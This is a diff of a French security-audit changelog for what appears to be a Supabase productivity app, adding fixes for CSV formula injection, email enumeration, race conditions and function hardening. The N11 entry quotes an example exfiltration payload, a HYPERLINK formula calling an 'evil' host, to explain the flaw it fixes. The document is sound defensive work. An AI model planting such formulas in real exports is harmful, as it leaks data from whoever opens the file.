@@ -61,6 +61,9 @@ Légende :
 | N2  | 🟡 Medium    | `shared_tasks.UPDATE` sans WITH CHECK          | ✅ Corrigé   | `011_security_hardening_v2.sql` |
 | N5  | 🟡 Low       | `AuthContext.isPremium` lit `user_metadata`    | ✅ Corrigé   | Retiré du context |
 | N6  | 🟡 Low       | `useUser()` lit identité depuis localStorage   | ✅ Corrigé   | `DashboardPage` migré sur `useAuth` |
+| N11 | 🟠 Medium    | CSV formula injection dans export RGPD          | ✅ Corrigé   | `csv-export.ts` (prefix apostrophe sur `=+-@\t\r`) |
+| N12 | 🟠 Medium    | `profiles SELECT` ouvert → énumération emails  | ✅ Corrigé   | `022_security_n12_n13.sql` (policy restreinte amis + RPC `resolve_profile_by_email`) |
+| N13 | 🟠 Medium    | `removeFriend` reciprocal silently no-op       | ✅ Corrigé   | `022_security_n12_n13.sql` + RPC `remove_friendship` |
 
 ---
 
@@ -334,9 +337,89 @@ Dans l'ordre, sur le projet de prod :
 -- 6. Verrouillage subscriptions v2 (À EXÉCUTER) — RPCs au lieu de trigger
 \i supabase/migration/015_subscriptions_rpc.sql
 
--- 7. Stripe webhook idempotency (NEW — fix N8)
+-- 7. Stripe webhook idempotency (fix N8)
 \i supabase/migration/017_processed_stripe_events.sql
+
+-- 8. Audit pré-déploiement 2026-05-23 (fix N12, N13)
+\i supabase/migration/022_security_n12_n13.sql
+
+-- 9. RPCs atomiques anti-race (fix TOCTOU-1, TOCTOU-2, TOCTOU-3, RACE-5)
+\i supabase/migration/023_atomic_toctou_rpcs.sql
+
+-- 10. Supabase advisors hardening (search_path + anon revoke + drop v1)
+\i supabase/migration/024_advisor_hardening.sql
 ```
+
+**État après application sur le projet de prod (ykeugqfgklejcdbrmawy)** : migrations 022 + 023 + 024 appliquées via MCP `apply_migration` le 2026-05-23. Vérification `get_advisors(security)` : 6 warnings restants, tous intentionnels (5 RPCs SECURITY DEFINER pour utilisateurs authentifiés, justifiés par le besoin de bypass RLS) + 1 manuel (HaveIBeenPwned password protection à activer dans le dashboard).
+
+---
+
+## 🛡️ Audit pré-déploiement 2026-05-23 — 3 nouvelles failles détectées
+
+Audit ciblé sur les changements depuis le cycle Deepsec (51 features livrées entre `aac04de` et HEAD).
+
+### N11 — CSV formula injection (Medium)
+
+**Fichier** : `src/lib/csv-export.ts`
+**Vecteur** : l'export RGPD (`exportTasksCSV`, `exportHabitsCSV`, etc.) ne neutralisait pas les valeurs commençant par `= + - @ \t \r`. Excel / Google Sheets interprètent ces préfixes comme formules → `=HYPERLINK("http://evil/?leak="&A1)` dans un nom de tâche peut exfiltrer des données à l'ouverture.
+**Fix** : `escapeCSV` préfixe une apostrophe `'` (invisible, neutralise l'interprétation formule) avant le quoting standard CSV. Pattern OWASP CSV Injection.
+
+### N12 — Énumération d'emails via `profiles` (Medium / RGPD)
+
+**Fichier** : `supabase/migration/018_profiles.sql`
+**Vecteur** : la policy initiale `SELECT TO authenticated USING (true)` laissait tout user inscrit faire `SELECT email FROM profiles` pour exfiltrer la base d'emails complète.
+**Fix** (migration 022) :
+- DROP de la policy ouverte
+- Nouvelle policy : lecture autorisée sur son propre profil OU sur les profils des amis confirmés (lien `friends`)
+- RPC `resolve_profile_by_email(p_email)` `SECURITY DEFINER` qui retourne UNIQUEMENT l'`id` (pas l'avatar/display_name) — utilisée par `shareTask` et `getByEmail` pour résoudre auth.uid sans nécessiter un SELECT direct sur `profiles`.
+- `friends.supabase.repository.ts` migré sur la RPC pour `getByEmail` et `shareTask`.
+
+### N13 — `removeFriend` reciprocal silently no-op (Medium / bug)
+
+**Fichier** : `src/modules/friends/supabase.repository.ts`
+**Vecteur** : la policy DELETE `auth.uid()=user_id` interdit la suppression cross-user → le `delete().eq('email', user.email).neq('user_id', user.id)` était un no-op systématique en prod. L'ex-ami gardait le caller dans sa liste.
+**Fix** (migration 022) : RPC `remove_friendship(p_friend_row_id)` `SECURITY DEFINER` qui supprime les deux côtés en une transaction après vérification de propriété (`friends.user_id = caller`). L'email cible vient de la propre ligne du caller, jamais d'un input arbitraire.
+
+### Déploiement requis
+
+```bash
+supabase db push   # applique 022_security_n12_n13.sql
+```
+
+Pas de redéploiement Edge Functions nécessaire (changement DB + client only).
+
+### Validation
+
+- ✅ `npm run lint` : 0 erreurs, 19 warnings (inchangé pré-existants)
+- ✅ `npm run build` : 31.9 s, 0 erreur
+- ✅ Migrations 022 + 023 idempotentes (`DROP POLICY IF EXISTS` + `CREATE OR REPLACE FUNCTION`)
+- ✅ Aucune régression sur `getAll()` : la policy autorise toujours la lecture des profils d'amis confirmés (cas d'usage actuel de l'enrichissement avatar)
+
+### TOCTOU/RACE fixes (migration 023)
+
+4 RPCs Postgres ajoutées pour éliminer les fenêtres de race read-modify-write côté client :
+
+- **TOCTOU-1** `toggle_habit_completion(p_habit_id, p_date)` : `jsonb_set` atomique sur `habits.completions` au lieu de SELECT → mutate JS → UPDATE.
+- **TOCTOU-2** `add_task_to_list(p_task_id, p_list_id)` / `remove_task_from_list` : `array_append` dédupliqué + `array_remove` côté DB.
+- **TOCTOU-3** `toggle_task_complete(p_task_id)` / `toggle_task_bookmark` : `UPDATE ... SET completed = NOT completed RETURNING *`. Gère aussi `completed_at` automatiquement.
+- **RACE-5** `accept_friend_request_v2(request_id)` : retourne directement la ligne `friends` créée (RETURNING). L'ancien client faisait un SELECT ORDER BY created_at DESC LIMIT 1 derrière le RPC v1 → race si deux acceptations concurrentes.
+
+Toutes les RPCs vérifient `auth.uid()` + scope `user_id = auth.uid()` (defense-in-depth avec la RLS). `SECURITY INVOKER` sauf `accept_friend_request_v2` (`SECURITY DEFINER` pour insérer le row côté sender). Permissions `REVOKE FROM PUBLIC` + `GRANT TO authenticated`.
+
+Repositories client mis à jour : `habits/supabase.repository.ts`, `tasks/supabase.repository.ts`, `lists/supabase.repository.ts`, `friends/supabase.repository.ts`.
+
+**TOCTOU-4 (OKR/KR atomicity)** : laissé ouvert. La logique actuelle entrelacée (table `key_results` + fallback JSONB pour anciens OKRs + journal `kr_completions` append-only) demande une refonte du chemin de write pour être atomique. Risque de régression trop élevé pour cet audit pré-déploiement. À traiter en PR dédiée.
+
+### Advisor hardening (migration 024)
+
+Suite à `get_advisors(security)`, 21 warnings éliminés en une migration :
+
+- **8 fonctions** sans `SET search_path` → recréées avec `SET search_path = public, pg_temp`. Bloque le shadowing par schema malveillant (`public.lower → attacker.lower`).
+- **7 trigger functions** exposées comme RPC public (set_friend_request_*, handle_new_user_profile, prevent_user_id_change, update_updated_at_column, subscriptions_guard, set_key_result_completed_at) → `REVOKE ALL FROM anon, authenticated, public`. Restent appelables par les triggers DB (path indépendant de l'API REST).
+- **10 RPCs SECURITY DEFINER légitimes** → `REVOKE EXECUTE FROM anon`. Seul `authenticated` peut les appeler.
+- **`accept_friend_request` v1** → DROP. Remplacée par v2 (migration 023), 0 call site client.
+
+**Restant** : `auth_leaked_password_protection` (HaveIBeenPwned) — à activer manuellement dans Supabase Dashboard → Authentication → Policies. Pas SQL-able.
 
 ---
 
@@ -393,11 +476,11 @@ Audit complet via Deepsec (Vercel Labs) sur les 114 fichiers du codebase.
 
 | ID  | Sévérité   | Sujet                                                    | Pourquoi pas auto-fixé |
 |-----|------------|----------------------------------------------------------|------------------------|
-| TOCTOU-1 | 🐛 BUG | `toggleCompletion` habit JSONB read-modify-write          | Nécessite RPC SQL (`jsonb_set` atomique) à écrire et déployer |
-| TOCTOU-2 | 🐛 BUG | `addTaskToList`/`removeTaskFromList` race                | Nécessite RPC `array_append/array_remove` SECURITY INVOKER |
-| TOCTOU-3 | 🐛 BUG | `toggleComplete`/`toggleBookmark` tasks read-then-write  | Nécessite RPC `UPDATE ... SET completed = NOT completed RETURNING *` |
-| TOCTOU-4 | 🐛 BUG | OKR/KR update snapshot vs write non atomique             | Nécessite Postgres function pour write + journal en une transaction |
-| RACE-5  | 🐛 BUG  | `acceptFriendRequest` fetch `ORDER BY created_at` race    | Nécessite modifier RPC `accept_friend_request` pour RETURNING |
+| TOCTOU-1 | ✅ Corrigé | `toggleCompletion` habit JSONB read-modify-write    | `023_atomic_toctou_rpcs.sql` — RPC `toggle_habit_completion` (jsonb_set atomique) |
+| TOCTOU-2 | ✅ Corrigé | `addTaskToList`/`removeTaskFromList` race           | `023_atomic_toctou_rpcs.sql` — RPCs `add_task_to_list` / `remove_task_from_list` |
+| TOCTOU-3 | ✅ Corrigé | `toggleComplete`/`toggleBookmark` tasks read-then-write | `023_atomic_toctou_rpcs.sql` — RPCs `toggle_task_complete` / `toggle_task_bookmark` |
+| TOCTOU-4 | 🔴 Ouvert  | OKR/KR update snapshot vs write non atomique         | Refonte trop large (3 chemins entrelacés key_results table + JSONB + kr_completions). Hors scope audit 2026-05-23. |
+| RACE-5  | ✅ Corrigé  | `acceptFriendRequest` fetch `ORDER BY created_at` race | `023_atomic_toctou_rpcs.sql` — RPC `accept_friend_request_v2` retourne le row créé |
 | ~~25~~  | ✅ Résolu | ~~`useUpdateUserSettings` orphelin en prod~~          | Hook conservé mais whitelist stricte (4 champs safe) + tous les call sites scopés `if (isDemo)` (SettingsPage.tsx:180, 307, 334). Prod passe par `supabase.auth.updateUser` directement. Vérifié 2026-05-23. |
 
 ### Déploiement requis (manuel — Supabase dashboard / CLI)
